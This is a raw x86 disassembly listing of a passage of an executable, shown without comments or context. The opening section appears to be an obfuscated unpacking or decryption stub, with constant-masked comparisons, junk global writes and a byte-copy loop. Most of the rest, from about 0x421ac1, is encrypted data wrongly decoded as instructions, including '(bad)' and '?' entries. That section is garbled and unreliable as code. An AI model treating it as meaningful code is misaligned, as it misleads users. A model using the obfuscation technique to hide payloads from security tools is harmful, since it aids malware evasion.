  421682:	mov    ecx,DWORD PTR [ecx+0x194]
  421688:	push   DWORD PTR [ecx]
  42168a:	call   eax
  42168c:	mov    ecx,DWORD PTR ds:0x428373
  421692:	mov    ecx,DWORD PTR [ecx+0x1cc]
  421698:	mov    DWORD PTR [ecx],eax
  42169a:	jmp    0x421870
  42169f:	mov    eax,DWORD PTR [esp+0x20]
  4216a3:	mov    ecx,DWORD PTR [esp+0x40]
  4216a7:	xor    eax,esi
  4216a9:	add    eax,ebx
  4216ab:	cmp    eax,ecx
  4216ad:	jne    0x421718
  4216b3:	mov    eax,DWORD PTR [esp+0x20]
  4216b7:	mov    ecx,DWORD PTR ds:0x428373
  4216bd:	mov    ecx,DWORD PTR [ecx+0x198]
  4216c3:	xor    eax,esi
  4216c5:	add    eax,ebx
  4216c7:	cmp    eax,DWORD PTR [ecx]
  4216c9:	jne    0x4216f1
  4216cf:	mov    eax,DWORD PTR [esp+0x20]
  4216d3:	push   0xffffffff
  4216d5:	push   0x70941f91
  4216da:	xor    eax,esi
  4216dc:	add    eax,ebx
  4216de:	push   eax
  4216df:	push   0xf89c85a1
  4216e4:	push   DWORD PTR [esp+0x1c]
  4216e8:	push   DWORD PTR [esp+0x34]
  4216ec:	call   0x41b999
  4216f1:	push   DWORD PTR [esp+0xc]
  4216f5:	push   DWORD PTR [esp+0x24]
  4216f9:	call   0x401000
  4216fe:	mov    eax,DWORD PTR [esp+0x20]
  421702:	xor    eax,esi
  421704:	add    eax,ebx
  421706:	mov    ds:0x4283ff,eax
  42170b:	mov    eax,DWORD PTR [esp+0x20]
  42170f:	xor    eax,esi
  421711:	add    eax,ebx
  421713:	mov    ds:0x4283f7,eax
  421718:	mov    eax,DWORD PTR [esp+0x2c]
  42171c:	test   eax,eax
  42171e:	je     0x421870
  421724:	mov    DWORD PTR [esp+0x4c],0xf152c3c
  42172c:	mov    DWORD PTR [esp+0x54],0x712ed2f
  421734:	mov    DWORD PTR [esp+0x48],0x373fc0d
  42173c:	mov    DWORD PTR [esp+0x50],0x72670add
  421744:	call   0x41932f
  421749:	mov    eax,DWORD PTR [esp+0x34]
  42174d:	mov    eax,DWORD PTR [esp+0xc]
  421751:	mov    DWORD PTR [esp+0x30],eax
  421755:	mov    eax,DWORD PTR [esp+0x20]
  421759:	mov    DWORD PTR [esp+0xc],eax
  42175d:	mov    eax,eax
  42175f:	mov    eax,ds:0x428373
  421764:	mov    ecx,DWORD PTR [eax+0x1c0]
  42176a:	mov    edx,DWORD PTR [ecx]
  42176c:	and    DWORD PTR [esp+0x14],0x0
  421771:	mov    edi,0xfabdbed2
  421776:	add    edx,edi
  421778:	adc    DWORD PTR [esp+0x14],0xffffffff
  42177d:	mov    ecx,0x8a29a143
  421782:	xor    edx,ecx
  421784:	mov    DWORD PTR [esp+0x18],edx
  421788:	mov    edx,DWORD PTR [esp+0x14]
  42178c:	xor    edx,0x0
  42178f:	cmp    DWORD PTR [esp+0x18],0x70941f90
  421797:	mov    DWORD PTR [esp+0x1c],edx
  42179b:	jne    0x4217aa
  4217a1:	cmp    edx,0xffffffff
  4217a4:	je     0x421813
  4217aa:	mov    eax,DWORD PTR [eax+0x1c8]
  4217b0:	mov    eax,DWORD PTR [eax]
  4217b2:	cdq    
  4217b3:	add    eax,edi
  4217b5:	adc    edx,0xffffffff
  4217b8:	and    DWORD PTR [esp+0x14],0x0
  4217bd:	xor    edx,0x0
  4217c0:	mov    DWORD PTR [esp+0x24],edx
  4217c4:	mov    edx,DWORD PTR [esp+0xc]
  4217c8:	mov    DWORD PTR [esp+0x10],edx
  4217cc:	xor    eax,ecx
  4217ce:	add    DWORD PTR [esp+0x10],edi
  4217d2:	mov    edx,DWORD PTR [esp+0x10]
  4217d6:	adc    DWORD PTR [esp+0x14],0xffffffff
  4217db:	xor    edx,ecx
  4217dd:	mov    DWORD PTR [esp+0x18],edx
  4217e1:	mov    edx,DWORD PTR [esp+0x14]
  4217e5:	xor    edx,0x0
  4217e8:	mov    DWORD PTR [esp+0x1c],edx
  4217ec:	cmp    DWORD PTR [esp+0x18],eax
  4217f0:	jne    0x421802
  4217f6:	mov    eax,DWORD PTR [esp+0x24]
  4217fa:	cmp    edx,eax
  4217fc:	je     0x421813
  421802:	mov    eax,DWORD PTR [esp+0xc]
  421806:	add    eax,DWORD PTR [esp+0x30]
  42180a:	mov    DWORD PTR [esp+0xc],eax
  42180e:	jmp    0x421870
  421813:	mov    eax,ds:0x4283f7
  421818:	mov    edx,DWORD PTR ds:0x4283ff
  42181e:	xor    eax,edx
  421820:	mov    ds:0x4283f7,eax
  421825:	mov    edx,DWORD PTR ds:0x4283f7
  42182b:	mov    eax,DWORD PTR [esp+0x2c]
  42182f:	add    DWORD PTR [eax],edx
  421831:	mov    edx,DWORD PTR [esp+0xc]
  421835:	mov    eax,ds:0x4283f7
  42183a:	xor    edx,esi
  42183c:	add    edx,ebx
  42183e:	xor    ebx,ebx
  421840:	add    edx,edi
  421842:	adc    ebx,0xffffffff
  421845:	xor    esi,esi
  421847:	xor    edx,ecx
  421849:	xor    ebx,0x0
  42184c:	add    eax,edi
  42184e:	adc    esi,0xffffffff
  421851:	xor    eax,ecx
  421853:	xor    esi,0x0
  421856:	cmp    eax,edx
  421858:	jne    0x421870
  42185e:	cmp    esi,ebx
  421860:	jne    0x421870
  421866:	mov    eax,ds:0x4283f7
  42186b:	mov    ds:0x4283ff,eax
  421870:	mov    eax,ds:0x428373
  421875:	push   0x4
  421877:	add    eax,0x1cc
  42187c:	push   eax
  42187d:	lea    eax,[esp+0x3c]
  421881:	push   eax
  421882:	call   0x421896
  421887:	mov    eax,DWORD PTR [esp+0x34]
  42188b:	mov    eax,DWORD PTR [eax]
  42188d:	pop    edi
  42188e:	pop    esi
  42188f:	pop    ebx
  421890:	mov    esp,ebp
  421892:	pop    ebp
  421893:	ret    0xc
  421896:	push   ebp
  421897:	mov    ebp,esp
  421899:	sub    esp,0x10
  42189c:	mov    eax,0xf89c85a5
  4218a1:	mov    DWORD PTR [ebp-0x4],eax
  4218a4:	mov    DWORD PTR ds:0x428ecb,0x1d
  4218ae:	cmp    DWORD PTR ds:0x428ecb,0x0
  4218b5:	je     0x421906
  4218bb:	cmp    DWORD PTR ds:0x428ecb,0x8
  4218c2:	jg     0x421906
  4218c8:	jmp    0x4218d8
  4218cd:	push   0x428e77
  4218d2:	call   DWORD PTR ds:0x42a9e7
  4218d8:	cmp    DWORD PTR ds:0x428ecb,0x9
  4218df:	jne    0x4218f2
  4218e5:	mov    edx,DWORD PTR ds:0x428ecb
  4218eb:	dec    edx
  4218ec:	mov    DWORD PTR ds:0x428ecb,edx
  4218f2:	xor    edx,edx
  4218f4:	add    edx,DWORD PTR ds:0x428ecb
  4218fa:	dec    edx
  4218fb:	mov    DWORD PTR ds:0x428ecb,edx
  421901:	jmp    0x4218ae
  421906:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  42190d:	xor    ecx,edx
  42190f:	mov    ecx,DWORD PTR [ebp-0x4]
  421912:	sbb    edx,0x5246
  421918:	push   esi
  421919:	or     DWORD PTR ds:0x428e5b,edi
  42191f:	mov    edx,0x75108af
  421924:	adc    DWORD PTR ds:0x428e43,0x2a82
  42192e:	xor    ecx,edx
  421930:	sbb    DWORD PTR ds:0x428e93,edi
  421936:	mov    esi,0x3272f6
  42193b:	push   edi
  42193c:	inc    DWORD PTR ds:0x428e47
  421942:	mov    edi,DWORD PTR [ebp+0x10]
  421945:	adc    DWORD PTR ds:0x428e43,0x428ecf
  42194f:	add    ecx,esi
  421951:	cmp    ecx,edi
  421953:	mov    DWORD PTR ds:0x428ea3,0x27d
  42195d:	je     0x421a9e
  421963:	mov    ecx,DWORD PTR ds:0x428e33
  421969:	or     DWORD PTR ds:0x428e2b,ecx
  42196f:	mov    ecx,DWORD PTR [ebp-0x4]
  421972:	mov    edi,DWORD PTR [ebp+0x10]
  421975:	xor    eax,eax
  421977:	xor    ecx,edx
  421979:	sub    DWORD PTR ds:0x428e2b,0x428e2f
  421983:	add    ecx,esi
  421985:	xor    DWORD PTR ds:0x428e6b,0x2e89
  42198f:	add    edi,0xfabdbed2
  421995:	mov    DWORD PTR ds:0x428e27,0xdb6
  42199f:	adc    eax,0xffffffff
  4219a2:	adc    DWORD PTR ds:0x428e23,0x428e77
  4219ac:	xor    eax,0x0
  4219af:	mov    DWORD PTR [ebp-0xc],eax
  4219b2:	push   ebx
  4219b3:	mov    eax,ds:0x428e37
  4219b8:	add    eax,DWORD PTR ds:0x428ebf
  4219be:	mov    ds:0x428e37,eax
  4219c3:	xor    ebx,ebx
  4219c5:	adc    DWORD PTR ds:0x428e4b,0x1a92
  4219cf:	xor    edi,0x8a29a143
  4219d5:	adc    eax,DWORD PTR ds:0x428e3b
  4219db:	mov    eax,ecx
  4219dd:	xor    DWORD PTR ds:0x428e4b,0x428e93
  4219e7:	add    eax,0xfabdbed2
  4219ec:	mov    DWORD PTR ds:0x428e2b,0x4aa
  4219f6:	adc    ebx,0xffffffff
  4219f9:	xor    eax,0x8a29a143
  4219fe:	and    DWORD PTR ds:0x428e9f,0x428e57
  421a08:	xor    ebx,0x0
  421a0b:	mov    DWORD PTR ds:0x428e3b,0x3b6d
  421a15:	cmp    eax,edi
  421a17:	jne    0x421a30
  421a1d:	cmp    ebx,DWORD PTR [ebp-0xc]
  421a20:	je     0x421a98
  421a26:	jmp    0x421a30
  421a2b:	mov    esi,0x3272f6
  421a30:	mov    eax,DWORD PTR [ebp-0x4]
  421a33:	mov    edi,DWORD PTR [ebp-0x8]
  421a36:	xor    edi,edx
  421a38:	add    edi,esi
  421a3a:	mov    esi,DWORD PTR [ebp+0x8]
  421a3d:	imul   edi,ecx
  421a40:	mov    ebx,DWORD PTR [ebp+0xc]
  421a43:	xor    eax,edx
  421a45:	add    eax,ecx
  421a47:	mov    al,BYTE PTR [ebx+eax*1+0x3272f6]
  421a4e:	mov    BYTE PTR [edi+esi*1],al
  421a51:	mov    eax,DWORD PTR [ebp-0x8]
  421a54:	mov    esi,DWORD PTR [ebp+0x10]
  421a57:	xor    eax,edx
  421a59:	xor    ebx,ebx
  421a5b:	add    esi,0xfabdbed2
  421a61:	adc    ebx,0xffffffff
  421a64:	lea    ecx,[ecx+eax*1+0x3272f6]
  421a6b:	xor    edi,edi
  421a6d:	xor    esi,0x8a29a143
  421a73:	xor    ebx,0x0
  421a76:	mov    eax,ecx
  421a78:	add    eax,0xfabdbed2
  421a7d:	adc    edi,0xffffffff
  421a80:	xor    eax,0x8a29a143
  421a85:	xor    edi,0x0
  421a88:	cmp    eax,esi
  421a8a:	jne    0x421a2b
  421a90:	cmp    edi,ebx
  421a92:	jne    0x421a2b
  421a98:	mov    eax,0xf89c85a4
  421a9d:	pop    ebx
  421a9e:	pop    edi
  421a9f:	pop    esi
  421aa0:	leave  
  421aa1:	ret    0xc
  421aa4:	push   ebp
  421aa5:	mov    ebp,esp
  421aa7:	push   ecx
  421aa8:	dec    eax
  421aa9:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  421ab0:	mov    ecx,DWORD PTR ds:0x428ea7
  421ab6:	sub    DWORD PTR ds:0x428e93,ecx
  421abc:	jmp    0x423e02
  421ac1:	loope  0x421acb
  421ac3:	jg     0x421b24
  421ac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ac6:	add    al,0xe1
  421ac8:	test   BYTE PTR [ecx+0x27bd524a],al
  421ace:	xor    al,0x20
  421ad0:	bound  ebp,QWORD PTR [edi-0x4a]
  421ad3:	add    BYTE PTR [ebx-0x7c7c9fa6],0xb4
  421ada:	inc    esp
  421adb:	bound  ebx,QWORD PTR [ebx-0x70]
  421ade:	in     eax,0xaf
  421ae0:	jmp    0x421b46
  421ae2:	push   ebx
  421ae3:	adc    al,0x23
  421ae5:	addr16 ss loope 0x421af1
  421ae9:	aad    0x1e
  421aeb:	push   ds
  421aec:	or     esi,ebx
  421aee:	add    bh,BYTE PTR [esi]
  421af0:	mov    ecx,0x7feb521f
  421af5:	mov    ds,esp
  421af7:	push   cs
  421af8:	div    BYTE PTR [esi+0x7e]
  421afb:	xchg   di,ax
  421afd:	xchg   edx,eax
  421afe:	sti    
  421aff:	adc    ebp,DWORD PTR [ebp+esi*8-0x4f15a396]
  421b06:	mov    ebp,0x23e0e9ef
  421b0b:	rcr    BYTE PTR [esi],1
  421b0d:	call   0x3e1d678e
  421b12:	sbb    ah,BYTE PTR [esi+0x4cc03fe6]
  421b18:	popa   
  421b19:	mov    esp,0x5c43e386
  421b1e:	xchg   esi,eax
  421b1f:	aas    
  421b20:	fs cwde 
  421b22:	mov    bh,0xa
  421b24:	clc    
  421b25:	add    al,0xbd
  421b27:	push   edx
  421b28:	cmp    edi,esp
  421b2a:	mov    dl,0xd2
  421b2c:	dec    esi
  421b2d:	ret    0x2934
  421b30:	ror    al,0x45
  421b33:	inc    ebx
  421b34:	jmp    0xf1b3e11c
  421b39:	pop    ecx
  421b3a:	test   DWORD PTR [ebp-0x7],ebx
  421b3d:	or     eax,0x1b42152d
  421b42:	or     BYTE PTR [edx+0x20c35212],0x2f
  421b49:	push   ds
  421b4a:	test   al,0x71
  421b4c:	and    al,BYTE PTR [ebp-0x7f]
  421b4f:	lods   eax,DWORD PTR ds:[esi]
  421b50:	add    al,0xc1
  421b52:	xor    DWORD PTR [edx-0x7cf09ca8],ebx
  421b58:	jb     0x421af4
  421b5a:	rol    BYTE PTR [eax+0x61],1
  421b5d:	mov    dl,0x62
  421b5f:	mov    bl,0xf1
  421b61:	or     ch,BYTE PTR [edx-0x2c]
  421b64:	dec    ebp
  421b65:	mov    dh,0x8c
  421b67:	rol    DWORD PTR [edi+ebp*8-0x16ba8bf2],1
  421b6e:	daa    
  421b6f:	jo     0x421b19
  421b71:	add    DWORD PTR [ebx-0x79],esi
  421b74:	push   ds
  421b75:	push   esi
  421b76:	enter  0xbfa,0xe1
  421b7a:	ret    0x923c
  421b7d:	cmp    DWORD PTR [ecx-0x1d],ebp
  421b80:	dec    eax
  421b81:	int3   
  421b82:	dec    esi
  421b83:	ffreep st(7)
  421b85:	add    DWORD PTR [ecx-0x60fcf63c],esi
  421b8b:	popa   
  421b8c:	fldcw  WORD PTR [edi]
  421b8e:	test   eax,0x407a2250
  421b93:	xchg   ecx,eax
  421b94:	xchg   BYTE PTR [edi],bl
  421b96:	ss jbe 0x421b3f
  421b99:	cdq    
  421b9a:	or     eax,0x77b9c06d
  421b9f:	ins    DWORD PTR es:[edi],dx
  421ba0:	mov    cl,0xa4
  421ba2:	mov    ebx,0xcc2cdb6c
  421ba7:	mov    bl,0x16
  421ba9:	ret    0xee1a
  421bac:	add    DWORD PTR [ebx+0x6],0x7f
  421bb0:	lods   al,BYTE PTR ds:[esi]
  421bb1:	cmp    al,0x4d
  421bb3:	aam    0x8c
  421bb5:	(bad)  
  421bb6:	into   
  421bb7:	and    eax,0xc53f0d24
  421bbc:	jmp    0x870a:0x251b9c40
  421bc3:	scas   eax,DWORD PTR es:[edi]
  421bc4:	ins    BYTE PTR es:[edi],dx
  421bc5:	mov    eax,ds:0x1b4f1390
  421bca:	pusha  
  421bcb:	add    esi,DWORD PTR [edx+0x4a]
  421bce:	data16 jns 0x421c26
  421bd1:	pop    ss
  421bd2:	xor    eax,0xdc7bb444
  421bd7:	xor    eax,DWORD PTR [eax-0x39]
  421bda:	inc    DWORD PTR [edi]
  421bdc:	sbb    eax,0x566d3393
  421be1:	jb     0x421bbd
  421be3:	dec    BYTE PTR [esi-0xf]
  421be6:	out    0x49,eax
  421be8:	sahf   
  421be9:	hlt    
  421bea:	fmul   QWORD PTR [esi-0x3a]
  421bed:	test   BYTE PTR [eax+0x57e7bd5b],al
  421bf3:	mov    cl,BYTE PTR [esi-0x7d3f7fa4]
  421bf9:	stos   DWORD PTR es:[edi],eax
  421bfa:	sub    DWORD PTR [eax],esp
  421bfc:	cld    
  421bfd:	repz push 0x9ace5617
  421c03:	arpl   cx,sp
  421c05:	pushf  
  421c06:	mov    al,0xcc
  421c08:	loop   0x421bb6
  421c0a:	test   al,0x13
  421c0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c0d:	mov    esp,0xcd08ae91
  421c12:	ins    BYTE PTR es:[edi],dx
  421c13:	mov    eax,ds:0x543e4434
  421c18:	adc    edi,DWORD PTR [edx+0x69]
  421c1b:	or     al,0x5e
  421c1d:	int3   
  421c1e:	(bad)  
  421c1f:	cmp    edi,esi
  421c21:	ret    0x2a31
  421c24:	adc    BYTE PTR [ebp-0x65c822ec],ah
  421c2a:	(bad)  
  421c2b:	jp     0x421c9e
  421c2d:	dec    ecx
  421c2e:	push   eax
  421c2f:	outs   dx,DWORD PTR ds:[esi]
  421c30:	sbb    al,0xbf
  421c32:	mov    bh,cl
  421c34:	xor    DWORD PTR [ebx],esp
  421c36:	aaa    
  421c37:	adc    eax,0x28778ec1
  421c3c:	imul   edx,ebp,0x35
  421c3f:	add    al,0x3f
  421c41:	sbb    ebx,0xc449f0f5
  421c47:	inc    esp
  421c48:	dec    ebx
  421c49:	adc    eax,0x70a59e72
  421c4e:	std    
  421c4f:	cmc    
  421c50:	inc    esi
  421c51:	sub    eax,0xd31482aa
  421c56:	mov    esp,0x7fd8a5fe
  421c5b:	outs   dx,BYTE PTR ds:[esi]
  421c5d:	or     ebx,DWORD PTR [eax]
  421c5f:	(bad)  
  421c60:	int3   
  421c61:	fild   QWORD PTR [edi]
  421c63:	ret    0xbb80
  421c66:	aam    0x19
  421c68:	inc    ebp
  421c69:	je     0x421c14
  421c6b:	pop    ecx
  421c6c:	scas   al,BYTE PTR es:[edi]
  421c6d:	inc    ecx
  421c6e:	test   al,0x85
  421c70:	cmp    al,0x4a
  421c72:	or     DWORD PTR [ebx+eax*8],esp
  421c75:	jno    0x421c5d
  421c77:	shl    DWORD PTR [ecx],0x8e
  421c7a:	lock jle 0x421c70
  421c7d:	mov    ecx,DWORD PTR [ecx+0x74]
  421c80:	(bad)  
  421c81:	fmul   st,st(7)
  421c83:	fiadd  WORD PTR [ebp-0x1d]
  421c86:	dec    ebx
  421c87:	rcr    bh,1
  421c89:	daa    
  421c8a:	xchg   ebx,eax
  421c8b:	mov    dl,0xd
  421c8d:	xor    al,0xd7
  421c8f:	lahf   
  421c90:	mov    bl,0xf9
  421c92:	sbb    edx,DWORD PTR [ebx+0x1c]
  421c95:	sbb    BYTE PTR [esi-0x50],ch
  421c98:	jp     0x421c43
  421c9a:	icebp  
  421c9b:	xchg   DWORD PTR [ebx+0x6d7f22e6],ebx
  421ca1:	out    0xcb,al
  421ca3:	popa   
  421ca4:	sub    eax,0x69c62204
  421ca9:	mov    ds:0x56aa22eb,al
  421cae:	int    0x25
  421cb0:	inc    ebx
  421cb1:	sub    ah,BYTE PTR [eax-0x49c44748]
  421cb7:	mov    esi,0x59450333
  421cbc:	fldenv [ebx+0x7d]
  421cbf:	xor    eax,0x5c8834e1
  421cc4:	sti    
  421cc5:	push   ebx
  421cc7:	or     ebx,DWORD PTR [edi+0x70]
  421cca:	add    ch,ah
  421ccc:	mov    WORD PTR [esi+0x3e4b02ef],?
  421cd2:	ror    BYTE PTR [ebx],cl
  421cd4:	jle    0x421d37
  421cd6:	sahf   
  421cd7:	out    dx,eax
  421cd8:	sub    DWORD PTR [esi-0x37],edx
  421cdb:	and    eax,0xc753627d
  421ce0:	xchg   ebx,eax
  421ce1:	nop
  421ce2:	lods   eax,DWORD PTR ds:[esi]
  421ce3:	sbb    al,0x79
  421ce5:	(bad)
  421ce8:	in     eax,0xba
  421cea:	or     esi,eax
  421cec:	and    eax,eax
  421cee:	in     al,0x77
  421cf0:	sub    ch,ch
  421cf2:	mov    ecx,0xa0077ce
  421cf7:	addr16 std 
  421cf9:	out    dx,al
  421cfa:	ins    DWORD PTR es:[edi],dx
  421cfb:	fiadd  DWORD PTR [edx+0x777bf995]
  421d01:	out    0xdc,eax
  421d03:	fisub  WORD PTR [esi-0x1d]
  421d06:	in     al,0xbf
  421d08:	cmp    al,0xab
  421d0a:	xchg   esp,eax
  421d0b:	pop    ebx
  421d0c:	sbb    dl,BYTE PTR [esi]
  421d0e:	test   al,0xf4
  421d10:	in     eax,0xe9
  421d12:	add    ecx,0x3
  421d15:	dec    edi
  421d16:	cld    
  421d17:	pop    es
  421d18:	pop    ebp
  421d19:	inc    edi
  421d1a:	es gs ret 
  421d1d:	sub    al,BYTE PTR [edi-0x37]
  421d20:	push   0x54
  421d22:	mwait  
  421d25:	push   ebx
  421d26:	pushf  
  421d27:	ins    DWORD PTR es:[edi],dx
  421d28:	adc    eax,0xe49d220a
  421d2d:	jnp    0x421d43
  421d2f:	in     al,0x26
  421d31:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  421d33:	enter  0xa30f,0x70
  421d37:	and    esp,ebx
  421d39:	into   
  421d3a:	out    0x2d,al
  421d3c:	mov    esp,0x52514266
  421d41:	jmp    0xf6c4:0x3d3e6b3f
  421d48:	pop    edx
  421d49:	aad    0x8b
  421d4b:	mov    ss,WORD PTR ds:0x8e470e48
  421d51:	cmc    
  421d52:	or     eax,DWORD PTR [ebx+0x20080dc7]
  421d58:	jnp    0x421d59
  421d5a:	adc    DWORD PTR [edi-0x2ef4a25e],esi
  421d60:	cmp    eax,0xa97857b7
  421d65:	add    DWORD PTR [edx+0x22],esp
  421d68:	jbe    0x421d17
  421d6a:	fmul   DWORD PTR [ebp-0xf]
  421d6d:	dec    ebx
  421d6e:	add    al,0x2c
  421d70:	sbb    eax,0xa1e2ab39
  421d75:	mov    ebp,0xc25c6125
  421d7a:	(bad)  
  421d7b:	cdq    
  421d7c:	push   0xffffffcb
  421d7e:	into   
  421d7f:	sbb    BYTE PTR [edi-0x1d],cl
  421d82:	mov    esp,DWORD PTR [ebx-0x4c1027bf]
  421d88:	pop    eax
  421d89:	mov    ch,0xf7
  421d8b:	or     esi,DWORD PTR [edx-0x2a]
  421d8e:	jle    0x421df1
  421d90:	sbb    al,ah
  421d92:	lods   eax,DWORD PTR ds:[esi]
  421d93:	pop    esi
  421d94:	dec    esi
  421d95:	cmp    edi,DWORD PTR [edi]
  421d97:	cwde   
  421d98:	sahf   
  421d99:	push   ss
  421d9a:	xchg   ebx,eax
  421d9b:	xchg   edi,eax
  421d9c:	mov    eax,ds:0x7b425a61
  421da1:	dec    edx
  421da2:	cmc    
  421da3:	pop    ebp
  421da4:	xor    DWORD PTR [ebx*8+0x4d538bff],edx
  421dab:	ja     0x421e20
  421dad:	mov    al,0x33
  421daf:	enter  0x9898,0xce
  421db3:	das    
  421db4:	mov    ebp,?
  421db6:	jae    0x421d9d
  421db8:	mov    ds:0xbd7b916,eax
  421dbd:	push   esp
  421dbe:	int3   
  421dbf:	add    eax,0x294f5e50
  421dc4:	or     eax,edx
  421dc6:	daa    
  421dc7:	jns    0x421de6
  421dc9:	in     al,0x8e
  421dcb:	popa   
  421dcc:	push   ebp
  421dcd:	jne    0x421db6
  421dcf:	sub    al,0x7c
  421dd1:	mov    ecx,0xaa718eba
  421dd6:	enter  0x4973,0x3f
  421dda:	stc    
  421ddb:	jns    0x421d99
  421ddd:	pop    ss
  421dde:	leave  
  421ddf:	mov    WORD PTR [ebp-0x2f],ds
  421de2:	fnstsw WORD PTR ds:0x751639df
  421de8:	cmc    
  421de9:	fmul   QWORD PTR [ebx+ebx*8]
  421dec:	dec    ebp
  421ded:	pusha  
  421dee:	das    
  421def:	sbb    DWORD PTR [eax-0x61],0x85cdb25d
  421df6:	pop    ax
  421df8:	and    DWORD PTR [edi],esi
  421dfa:	pop    ds
  421dfb:	sub    al,0x92
  421dfd:	jmp    0xef12:0x9d85645
  421e04:	fnsave [ebp+0x6c763f03]
  421e0a:	xor    ah,dh
  421e0c:	mov    eax,DWORD PTR [ecx]
  421e0e:	sti    
  421e0f:	ret    0x29fb
  421e12:	aas    
  421e13:	xchg   edx,eax
  421e14:	retf   0xead8
  421e17:	mov    dh,0xf5
  421e19:	nop
  421e1a:	dec    eax
  421e1b:	fcomp  DWORD PTR [edi+0x68]
  421e1e:	adc    bh,cl
  421e20:	imul   ebp,DWORD PTR [edi],0x7a48e0a5
  421e26:	cmp    eax,0xba413904
  421e2b:	fnstcw WORD PTR [edx-0x620fea56]
  421e31:	or     ebp,0xffffffdf
  421e34:	pop    ebp
  421e35:	adc    al,0x3d
  421e37:	inc    ebx
  421e38:	pop    ds
  421e39:	vmaxsd xmm0,xmm1,QWORD PTR [ebp+0x45]
  421e3e:	addr16 pushf 
  421e40:	mov    esi,0xdfc42646
  421e45:	sub    cl,dh
  421e47:	iret   
  421e48:	call   0x19ea:0x9ec1a2a6
  421e4f:	in     eax,0x89
  421e51:	xchg   ebp,eax
  421e52:	push   es
  421e53:	in     eax,dx
  421e54:	in     eax,dx
  421e55:	inc    edx
  421e56:	xchg   DWORD PTR [edx],ecx
  421e58:	ficom  WORD PTR [edx+0x34c2bfa9]
  421e5e:	add    DWORD PTR [ebx],ebx
  421e60:	mov    bh,0x44
  421e62:	mov    eax,0x6ddf7856
  421e67:	mov    al,ds:0xa3f73f53
  421e6c:	sub    al,0xaa
  421e6e:	std    
  421e6f:	out    0x92,eax
  421e71:	shl    BYTE PTR [esi],cl
  421e73:	dec    esi
  421e74:	ds jbe 0x421e3f
  421e77:	cld    
  421e78:	pop    es
  421e79:	dec    esi
  421e7a:	mov    cs,WORD PTR [eax-0xa05541a]
  421e80:	cmp    eax,0x7ac6349b
  421e85:	dec    edi
  421e86:	(bad)  
  421e87:	fcomip st,st(0)
  421e89:	repnz mov ss,WORD PTR cs:[eax]
  421e8d:	inc    ecx
  421e8e:	into   
  421e8f:	xor    al,BYTE PTR [edi+0x47c69db2]
  421e95:	mov    cl,0x40
  421e97:	xor    DWORD PTR [edi+0xb],ebx
  421e9a:	add    DWORD PTR [ecx+esi*2-0x6d97af3],ebx
  421ea1:	sub    eax,0xbd8cbe5d
  421ea6:	jnp    0x421f00
  421ea8:	adc    ebp,edx
  421eaa:	mov    ebx,0xffc360c8
  421eaf:	xchg   esi,eax
  421eb0:	cld    
  421eb1:	nop
  421eb2:	repz mov esp,0x28e26c91
  421eb8:	(bad)  
  421eb9:	cmp    ecx,DWORD PTR [ecx+0x4]
  421ebc:	adc    al,0x1f
  421ebe:	mov    ebx,0x223b600e
  421ec3:	stos   BYTE PTR es:[edi],al
  421ec4:	ins    BYTE PTR es:[edi],dx
  421ec5:	es pop ecx
  421ec7:	or     al,0x51
  421ec9:	mov    ds:0xeaa50ad9,eax
  421ece:	inc    ecx
  421ecf:	stos   BYTE PTR es:[edi],al
  421ed0:	add    ah,BYTE PTR [edx+esi*1+0x71]
  421ed4:	mov    ch,0x88
  421ed6:	(bad)
  421ed9:	mov    ds:0x8bf74f15,eax
  421ede:	retf   
  421edf:	cmp    DWORD PTR [ebx],0xb4eff80b
  421ee5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ee6:	dec    ebx
  421ee7:	cdq    
  421ee8:	mov    ds:0x55c055de,eax
  421eed:	add    DWORD PTR [esi],eax
  421eef:	outs   dx,DWORD PTR ds:[esi]
  421ef0:	push   cs
  421ef1:	push   0x17
  421ef3:	xor    al,0xa3
  421ef5:	ret    
  421ef6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ef7:	rcl    BYTE PTR [ebx+0x3],cl
  421efa:	test   DWORD PTR [ecx+0x79],0x129646db
  421f01:	push   cs
  421f02:	jecxz  0x421f13
  421f04:	and    BYTE PTR [esi],dh
  421f06:	inc    ebp
  421f07:	xchg   BYTE PTR [ebx-0x54],dh
  421f0a:	sbb    eax,0xc75aeb5f
  421f0f:	jb     0x421f36
  421f11:	sub    DWORD PTR [ecx],edi
  421f13:	shl    bl,0xb9
  421f16:	ror    BYTE PTR [ecx+0x61c565e3],1
  421f1c:	cld    
  421f1d:	push   esi
  421f1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f1f:	add    eax,0x73e0dd15
  421f24:	imul   edx,ebp,0x5e
  421f27:	mov    ch,0x73
  421f29:	clc    
  421f2a:	je     0x421ed4
  421f2c:	push   ds
  421f2d:	jnp    0x421f38
  421f2f:	push   esi
  421f30:	xchg   ecx,eax
  421f31:	mov    ds:0x2e62b458,al
  421f36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f37:	sub    al,0x8b
  421f39:	dec    esi
  421f3a:	push   ss
  421f3b:	and    DWORD PTR [ebx],ecx
  421f3d:	ja     0x421f4b
  421f3f:	lods   eax,DWORD PTR ds:[esi]
  421f40:	cmp    esp,DWORD PTR [edi-0x320bbc96]
  421f46:	(bad)  
  421f48:	adc    DWORD PTR [ebx],esi
  421f4a:	mov    al,ds:0x5db27ee3
  421f4f:	sbb    DWORD PTR cs:[edi],esi
  421f52:	call   0x1cad:0x5949b51d
  421f59:	mov    ebx,0x155cb52a
  421f5e:	inc    esp
  421f5f:	loope  0x421f01
  421f61:	add    BYTE PTR ds:0x3a50611b,0xcc
  421f68:	dec    ebx
  421f69:	mov    BYTE PTR [edi],ah
  421f6b:	in     al,dx
  421f6c:	xchg   edx,eax
  421f6e:	lds    eax,FWORD PTR [esi+0x74b30ec7]
  421f74:	jmp    0x421f46
  421f76:	sub    edi,edi
  421f78:	addr16 aad 0x5c
  421f7b:	(bad)  
  421f7c:	pop    ds
  421f7d:	pusha  
  421f7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f7f:	mov    bh,0xd9
  421f81:	imul   edx,DWORD PTR [eax+0x2bed6cff],0xc625d39f
  421f8b:	and    ebp,DWORD PTR [ebp+0x2f]
  421f8e:	call   FWORD PTR [esi-0x21ce7e44]
